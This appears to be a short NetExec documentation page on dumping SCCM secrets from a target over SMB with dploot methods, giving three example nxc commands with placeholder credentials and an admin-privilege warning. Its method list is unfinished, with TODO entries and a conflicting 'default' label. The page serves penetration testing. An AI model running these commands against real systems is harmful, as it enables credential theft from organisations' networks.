# Dump SCCM

### Dump the SCCM from target using methods from dploot

{% hint style="danger" %}
Requires Domain Admin or Local Admin Priviledges on target Domain Controller
{% endhint %}

```
2 methods are available:   
(default) 	wmi -  TODO
			disk - TODO (default)
```

```
#~ nxc smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --sccm
#~ nxc smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --sccm disk
#~ nxc smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --sccm wmi
```
